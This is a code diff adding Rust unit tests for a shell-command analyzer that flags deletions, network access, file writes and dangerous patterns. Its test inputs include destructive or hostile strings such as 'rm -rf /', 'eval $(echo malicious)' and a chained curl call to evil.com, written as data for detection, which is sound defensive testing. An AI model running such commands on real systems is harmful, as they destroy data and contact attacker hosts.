@@ -256,4 +256,74 @@ mod tests {
         let a = analyze_command("eval $(echo malicious)");
         assert!(a.has_dangerous_patterns);
     }
+
+    // ── Edge cases ──
+
+    #[test]
+    fn subshell_commands_detected() {
+        let a = analyze_command("(cd /tmp && rm -rf test)");
+        assert!(a.has_deletions);
+    }
+
+    #[test]
+    fn chained_commands_with_semicolons() {
+        let a = analyze_command("echo start; curl http://evil.com; echo done");
+        assert!(a.has_network_access);
+        assert!(a.commands.contains(&"curl".to_string()));
+    }
+
+    #[test]
+    fn and_chain_commands() {
+        let a = analyze_command("mkdir -p build && cd build && cmake ..");
+        assert!(a.commands.contains(&"mkdir".to_string()));
+        assert!(a.commands.contains(&"cmake".to_string()));
+    }
+
+    #[test]
+    fn kill_detected_as_process_control() {
+        let a = analyze_command("kill -9 1234");
+        assert!(a.has_process_control);
+    }
+
+    #[test]
+    fn safe_command_has_no_flags() {
+        let a = analyze_command("cargo test --workspace");
+        assert!(!a.has_deletions);
+        assert!(!a.has_network_access);
+        assert!(!a.has_permission_changes);
+        assert!(!a.has_process_control);
+        assert!(!a.has_dangerous_patterns);
+    }
+
+    #[test]
+    fn heredoc_detected_as_write() {
+        let a = analyze_command("cat <<EOF > /tmp/file\nhello\nEOF");
+        assert!(a.has_file_writes);
+    }
+
+    #[test]
+    fn mv_detected_as_file_write() {
+        let a = analyze_command("mv old.txt new.txt");
+        assert!(a.has_file_writes);
+    }
+
+    #[test]
+    fn empty_command_no_crash() {
+        let a = analyze_command("");
+        assert!(a.commands.is_empty());
+        assert!(!a.has_dangerous_patterns);
+    }
+
+    #[test]
+    fn rm_rf_root_is_dangerous() {
+        let a = analyze_command("rm -rf /");
+        assert!(a.has_deletions);
+        assert!(a.has_dangerous_patterns);
+    }
+
+    #[test]
+    fn tee_detected_as_write() {
+        let a = analyze_command("echo data | tee output.log");
+        assert!(a.has_file_writes);
+    }
 }
